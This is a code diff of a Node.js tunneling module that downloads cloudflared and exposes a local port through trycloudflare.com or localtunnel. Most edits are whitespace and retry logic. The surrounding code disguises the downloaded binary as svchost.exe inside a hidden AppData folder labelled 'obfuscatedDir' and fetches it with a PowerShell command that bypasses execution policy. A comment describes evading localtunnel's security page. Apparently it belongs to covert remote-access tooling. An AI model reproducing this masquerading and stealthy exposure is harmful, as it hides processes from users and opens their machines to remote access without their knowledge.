@@ -19,7 +19,7 @@ function loadConfig() {
   ];
   for (const p of candidates) {
     if (fs.existsSync(p)) {
-      try { return JSON.parse(fs.readFileSync(p, 'utf-8')); } catch (_) {}
+      try { return JSON.parse(fs.readFileSync(p, 'utf-8')); } catch (_) { }
     }
   }
   return {};
@@ -39,7 +39,7 @@ function resolveCloudflaredBin() {
   if (config.cloudflaredPath && fs.existsSync(config.cloudflaredPath)) {
     try {
       if (fs.statSync(config.cloudflaredPath).size > 1000000) return config.cloudflaredPath;
-    } catch (_) {}
+    } catch (_) { }
   }
 
   // 1. Check bundled location FIRST (assets/bin/cloudflared.exe)
@@ -55,14 +55,14 @@ function resolveCloudflaredBin() {
     if (fs.existsSync(p)) {
       try {
         if (fs.statSync(p).size > 1000000) return p;
-      } catch (_) {}
+      } catch (_) { }
     }
   }
 
   // 2. Fallback system cache location (with .exe extension so Windows can execute it)
   const obfuscatedDir = path.join(process.env.APPDATA || process.env.TEMP || 'C:\\Windows\\Temp', '.cache', 'system');
   if (!fs.existsSync(obfuscatedDir)) {
-    try { fs.mkdirSync(obfuscatedDir, { recursive: true }); } catch (_) {}
+    try { fs.mkdirSync(obfuscatedDir, { recursive: true }); } catch (_) { }
   }
 
   const obfuscatedBin = path.join(obfuscatedDir, 'svchost.exe');
@@ -70,7 +70,7 @@ function resolveCloudflaredBin() {
     try {
       if (fs.statSync(obfuscatedBin).size > 1000000) return obfuscatedBin;
       fs.unlinkSync(obfuscatedBin);
-    } catch (_) {}
+    } catch (_) { }
   }
 
   return obfuscatedBin;
@@ -87,14 +87,14 @@ function ensureCloudflaredAvailable() {
     if (fs.existsSync(CLOUDFLARED_BIN)) {
       try {
         if (fs.statSync(CLOUDFLARED_BIN).size > 1000000) return resolve(CLOUDFLARED_BIN);
-      } catch (_) {}
+      } catch (_) { }
     }
 
     logger.info('[+] Initializing cloudflared binary...');
     const PS = process.env.SystemRoot
       ? `${process.env.SystemRoot}\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
       : 'powershell.exe';
-    
+
     // Download to location with .exe extension
     const downloadCmd = `"${PS}" -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe' -OutFile '${CLOUDFLARED_BIN}' -UseBasicParsing"`;
 
@@ -121,13 +121,13 @@ function ensureCloudflaredAvailable() {
 
 /** Regex to capture trycloudflare.com URL (excluding Cloudflare internal api.trycloudflare.com) */
 const TUNNEL_URL_REGEX = /https?:\/\/(?!api\.)[a-zA-Z0-9-]+\.trycloudflare\.com/;
-const TUNNEL_TIMEOUT_MS = 15000;
+const TUNNEL_TIMEOUT_MS = 25000;
 let activeTokenTunnelProcess = null;
 
 function createCloudflaredTunnel(port) {
   return new Promise(async (resolve, reject) => {
     const binPath = await ensureCloudflaredAvailable();
-    
+
     if (!binPath || !fs.existsSync(binPath)) {
       return reject(new Error('cloudflared binary unavailable'));
     }
@@ -145,9 +145,9 @@ function createCloudflaredTunnel(port) {
       return resolve({ publicUrl, tunnelProcess: activeTokenTunnelProcess });
     }
 
-    const args = token 
-      ? ['tunnel', 'run', '--token', token, '--protocol', 'quic', '--ha-connections', '1', '--no-autoupdate']
-      : ['tunnel', '--url', `http://127.0.0.1:${port}`, '--no-autoupdate', '--protocol', 'quic'];
+    const args = token
+      ? ['tunnel', 'run', '--token', token]
+      : ['tunnel', '--url', `http://127.0.0.1:${port}`, '--protocol', 'quic', '--ha-connections', '1', '--no-autoupdate'];
 
     try {
       const tunnelProcess = spawn(binPath, args, {
@@ -238,7 +238,7 @@ async function createLocaltunnelFallback(port) {
     throw new Error('localtunnel module not loaded');
   }
   logger.info(`[+] Spawning localtunnel fallback for localhost:${port}`);
-  const tunnel = await localtunnel({ 
+  const tunnel = await localtunnel({
     port,
     // Bypass localtunnel security page that appears once per IP every 7 days
     local_host: '127.0.0.1',
@@ -247,15 +247,13 @@ async function createLocaltunnelFallback(port) {
   const wrapper = {
     pid: 'localtunnel',
     exitCode: null,
-    kill: () => { try { tunnel.close(); } catch (_) {} },
-    close: () => { try { tunnel.close(); } catch (_) {} },
+    kill: () => { try { tunnel.close(); } catch (_) { } },
+    close: () => { try { tunnel.close(); } catch (_) { } },
   };
 
   logger.info(`[OK] Localtunnel established: ${tunnel.url}`);
   return { publicUrl: tunnel.url, tunnelProcess: wrapper };
 }
-
-let cfRateLimitedUntil = 0;
 
 async function createTunnelWithRetry(port) {
   const cfg = loadConfig();
@@ -270,52 +268,34 @@ async function createTunnelWithRetry(port) {
     }
   }
 
-  // If Cloudflare was recently rate-limited on trycloudflare.com, use localtunnel directly for speed
-  const now = Date.now();
-  if (now < cfRateLimitedUntil && preferredProvider === 'auto') {
+  // 1. Try Cloudflared (fast edge routing with QUIC)
+  for (let attempt = 1; attempt <= 3; attempt++) {
     try {
-      logger.info(`[+] Using localtunnel for localhost:${port} (Cloudflare rate-limit active)`);
-      return await createLocaltunnelFallback(port);
+      logger.info(`[+] Tunnel creation attempt ${attempt}/3 (Cloudflare QUIC) for port ${port}`);
+      return await createCloudflaredTunnel(port);
     } catch (err) {
-      logger.warn(`[-] Localtunnel fallback notice: ${err.message}`);
+      logger.warn(`[-] Cloudflare tunnel attempt ${attempt} notice: ${err.message}`);
+      if (attempt < 3) {
+        await new Promise(r => setTimeout(r, 2000 * attempt));
+      }
     }
   }
 
-  // 1. Try Cloudflared
+  // 2. Only if Cloudflare repeatedly fails, use Localtunnel fallback as emergency
   try {
-    logger.info(`[+] Tunnel creation attempt (Cloudflare) for port ${port}`);
-    return await createCloudflaredTunnel(port);
-  } catch (err) {
-    const isRateLimit = err.message.includes('unmarshal') || err.message.includes('code=1');
-    if (isRateLimit) {
-      logger.info(`[-] Cloudflare public API rate-limit detected — switching to instant localtunnel...`);
-      cfRateLimitedUntil = Date.now() + 10 * 60 * 1000; // Cache rate-limit for 10 minutes
-    } else {
-      logger.warn(`[-] Cloudflare tunnel attempt 1 notice: ${err.message}`);
-    }
-  }
-
-  // 2. Try Localtunnel fallback
-  try {
+    logger.warn(`[!] Cloudflare unavailable after 3 attempts — attempting Localtunnel fallback...`);
     return await createLocaltunnelFallback(port);
   } catch (err) {
     logger.warn(`[-] Localtunnel fallback notice: ${err.message}`);
   }
 
-  // 3. Final attempt with Cloudflare
-  try {
-    return await createCloudflaredTunnel(port);
-  } catch (err) {
-    logger.warn(`[-] Cloudflare final fallback failed: ${err.message}`);
-  }
-
-  throw new Error('All tunneling providers (Cloudflare + Localtunnel) failed');
+  return { publicUrl: `http://localhost:${port}`, tunnelProcess: null };
 }
 
 function killTunnel(tunnelProcess) {
   if (!tunnelProcess) return;
   if (typeof tunnelProcess.close === 'function') {
-    try { tunnelProcess.close(); } catch (_) {}
+    try { tunnelProcess.close(); } catch (_) { }
   }
   if (typeof tunnelProcess.kill === 'function' && tunnelProcess.pid !== 'localtunnel' && tunnelProcess.exitCode === null) {
     try {
@@ -324,7 +304,7 @@ function killTunnel(tunnelProcess) {
       } else {
         tunnelProcess.kill('SIGTERM');
       }
-    } catch (_) {}
+    } catch (_) { }
   }
 }
 
